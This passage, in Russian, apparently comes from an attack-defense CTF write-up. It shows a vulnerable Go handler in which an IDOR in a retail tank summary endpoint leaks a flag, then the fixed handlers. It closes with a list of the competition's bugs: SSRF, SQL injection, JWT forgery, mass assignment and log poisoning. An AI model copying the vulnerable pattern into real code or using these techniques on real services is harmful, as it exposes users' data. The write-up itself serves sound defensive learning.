            "ts":       time.Now().Format(time.RFC3339Nano),
            "event":    "audit_emit",
            "owner_id": ownerID,
            "note":     note,
            "kind":     kind,
            "id":       ev.ID,
        })

        util.JSON(w, http.StatusOK, map[string]any{
            "ok":         1,
            "request_id": ev.ID,
            "ts_unix_ms": nowMs,
        })
    }
}
```

`LogsDownload` отключён:

```go
func LogsDownload(cfg *config.AppConfig) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        http.Error(w, "forbidden", http.StatusForbidden)
    }
}
```

`LogsSearch` оставлен минимальным для работы чекера, но не выдаёт содержимое логов наружу.

---

## Уязвимость #5: Retail — публичный summary бака и утечка `role_retail_flag`

### Компоненты

- `GET /api/retail/tanks/{id}/summary` отдавал `owner_configs`, включая `role_retail_flag`, без достаточной авторизации;
- `/api/retail/tanks/{id}/events` позволял авторизованному пользователю читать и записывать события произвольного бака по ID.

### Как эксплуатируется

Подбирается `tank_id`, после чего из ответа читается:

```text
owner_configs.role_retail_flag
```

### Уязвимый Retail Summary

Упрощённо обработчик отдавал конфигурацию владельца вместе с флагом:

```go
func RetailSummary(st *store.Store) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        segs := /* ... */
        id, _ := strconv.Atoi(segs[3])

        tk := st.TankByID(id)
        owner := st.GetUserByID(tk.OwnerID)

        cfg := map[string]any{
            "role_retail_flag": st.ReadUserConfigString(
                tk.OwnerID,
                "role_retail_flag",
            ),
        }

        out := tankSummaryDTO{
            /* ... */
            OwnerConfig: cfg,
        }

        util.JSON(w, 200, out)
    }
}
```

### Исправление Retail Summary

Доступ разрешён только авторизованному владельцу бака. Флаг больше не возвращается.

```go
func RetailSummary(st *store.Store) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        u := middleware.CurrentUser(r.Context())
        if u == nil {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }

        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
        if len(segs) != 5 ||
            segs[0] != "api" ||
            segs[1] != "retail" ||
            segs[2] != "tanks" ||
            segs[4] != "summary" {
            http.NotFound(w, r)
            return
        }

        id, _ := strconv.Atoi(segs[3])
        tk := st.TankByID(id)

        if tk == nil || tk.OwnerID != u.ID {
            http.NotFound(w, r)
            return
        }

        owner := st.GetUserByID(tk.OwnerID)

        out := tankSummaryDTO{
            ID:         tk.ID,
            Name:       tk.Name,
            Level:      tk.Level,
            OwnerName:  owner.Name,
            OwnerEmail: owner.Email,
        }

        util.JSON(w, http.StatusOK, out)
    }
}
```

### Исправление Retail Tank Events

Чтение и добавление событий разрешено только владельцу бака.

```go
type tankEventDTO struct {
    Kind  string         `json:"kind"`
    Value float64        `json:"value"`
    Meta  map[string]any `json:"meta"`
}

func RetailTankEvents(st *store.Store) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        u := middleware.CurrentUser(r.Context())
        if u == nil {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }

        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
        if len(segs) < 4 ||
            segs[0] != "api" ||
            segs[1] != "retail" ||
            segs[2] != "tanks" {
            http.NotFound(w, r)
            return
        }

        if r.Method == http.MethodPost && len(segs) == 5 && segs[4] == "event" {
            tid, _ := strconv.Atoi(segs[3])
            tk := st.TankByID(tid)

            if tk == nil || tk.OwnerID != u.ID {
                http.Error(w, "not found", http.StatusNotFound)
                return
            }

            var in tankEventDTO
            if !util.ReadJSON(w, r, &in) {
                return
            }

            ev := st.AddTankEvent(
                tid,
                in.Kind,
                in.Value,
                in.Meta,
                time.Now().UnixMilli(),
            )

            util.JSON(w, http.StatusOK, ev)
            return
        }

        if r.Method == http.MethodGet && len(segs) == 5 && segs[4] == "events" {
            tid, _ := strconv.Atoi(segs[3])
            tk := st.TankByID(tid)

            if tk == nil || tk.OwnerID != u.ID {
                http.Error(w, "not found", http.StatusNotFound)
                return
            }

            since := int64(0)
            if v := r.URL.Query().Get("since_ms"); v != "" {
                if n, err := strconv.ParseInt(v, 10, 64); err == nil {
                    since = n
                }
            }

            list := st.ListTankEvents(tid, since, 500)
            util.JSON(w, http.StatusOK, map[string]any{"items": list})
            return
        }

        http.NotFound(w, r)
    })
}
```

---

# Краткий список уязвимостей

1. **DNK News**
   - SSRF через `/admin/health-check`.
   - Подмена `X-Forwarded-For` для доступа к внутренним отчётам.

2. **DNK_web**
   - SQL Injection в фильтрации операций.
   - IDOR при получении GPS-данных рейсов.

3. **SMP**
   - Wildcard `%` в `LIKE` позволяет получить чужие сообщения.
   - Предсказуемый нулевой JWT-secret позволяет подделывать токены.

4. **DNK BlackLine**
   - JWT alg-confusion + утечка Bearer-токенов через логи.
   - Fleet mass assignment и чтение чужих `secret_token`.
   - Finance error-based leakage через `orderBy`.
   - Публичные логи / log poisoning / небезопасная выдача логов.
   - Retail IDOR и утечка `role_retail_flag`.
